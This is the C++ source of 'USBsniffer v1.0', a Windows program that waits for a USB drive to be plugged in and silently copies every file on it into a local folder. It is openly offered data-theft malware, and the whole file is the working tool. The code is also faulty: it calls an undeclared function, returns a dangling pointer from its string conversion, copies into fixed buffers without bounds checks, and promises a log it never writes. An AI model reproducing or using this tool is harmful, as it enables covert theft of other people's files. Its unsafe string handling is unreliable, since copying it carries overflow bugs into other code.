#include <iostream>
#include <stdlib.h>
#include <io.h>
#include <windows.h>
#include <string>
#include <sys/types.h>
#include <sys/stat.h>
using namespace std;
void copyfiles(string source,char *target);
char *StringToChar(string source);
bool IsDirectory(const char* fname);
void Init();
int main(int argc,char **argv){
if(argc!=2){
   Init();
}
else{
   while(access(*(argv+1),0)==0){ // if directory already exist,this will auto add '\1' back it;
     strcat(*(argv+1),"\\1\\");
   }
     if(createDirectory(*(argv+1),NULL)){
       DWORD frist=GetLogicalDrives();
       DWORD second,n=0;
       string targetPath="0";
       while(1){ // every 3 seconds to estimate if there is a USB device
         Sleep(3000);
         second=GetLogicalDrives();
         if(second-frist>0){
           second-=frist;
           while(second>>=1) n++;
           targetPath[0]=n+65;
           targetPath+=":\\*";
           copyfiles(targetPath,*(argv+1));
           return 0;
         }
       }
     }
}
}
void copyfiles(string source,char *target){
WIN32_FIND_DATA FindFileData;
HANDLE hFind;
char *sourceDir=0;
int len;
sourceDir=StringToChar(source);
len=strlen(sourceDir);
hFind = FindFirstFile(sourceDir, &FindFileData); //find the target dirctory's frist file;
sourceDir[len-1]='\0'; // take out '*';
while(1){
   if(hFind == INVALID_HANDLE_VALUE){ //file found error
     break;
   }
   else{
     char temp[200];
     char tempPath[200],tempSource[200];
     strcpy(temp,sourceDir);
     strcat(temp,FindFileData.cFileName);
     if(IsDirectory(temp)== true){ //estimate whether is a directory
       if(strcmp(FindFileData.cFileName,".")&&strcmp(FindFileData.cFileName,"..")){ //take out . & ..dirc
         strcpy(tempSource,sourceDir);
         strcat(tempSource,FindFileData.cFileName);
         strcpy(tempPath,target);
         strcat(tempPath,FindFileData.cFileName);
         createDirectory(tempPath,NULL);
         strcat(tempSource,"\\*");
         strcat(tempPath,"\\");
         copyfiles(tempSource,tempPath); //Recursion 
       }
     }
     else{ //if is a file,copy to target dirc
       strcpy(tempSource,sourceDir);
       strcpy(tempPath,target);
       strcat(tempPath,FindFileData.cFileName);
       strcat(tempSource,FindFileData.cFileName);
       CopyFile(tempSource,tempPath,false);
     }
     if(FindNextFile(hFind,&FindFileData)==0) break; //found the next file
   }
}
FindClose(hFind);  //handle closed;
} 
char* StringToChar(string source){ //string convent to char*
char *ch=new char[source.length()];
ch=(char*)source.c_str();
return ch;
}
bool IsDirectory(const char* fname) //Directory estimate
{
return FILE_ATTRIBUTE_DIRECTORY == GetFileAttributes(fname) ? true : false;
} 
void Init(){ //init function
cout<<" USBsniffer v1.0 "<<endl
   <<"e.g: usbsniffer c:\\usb\\"<<endl
   <<" Then the USB Device'all files will be copy to the directory of c:\\usb\\ without any movement"
   <<",and the whole log will be saved to c:\\log.txt"<<endl
   <<" Witten By SeeK QQ:771014"<<endl
   <<" 2007.2.17"<<endl;
}
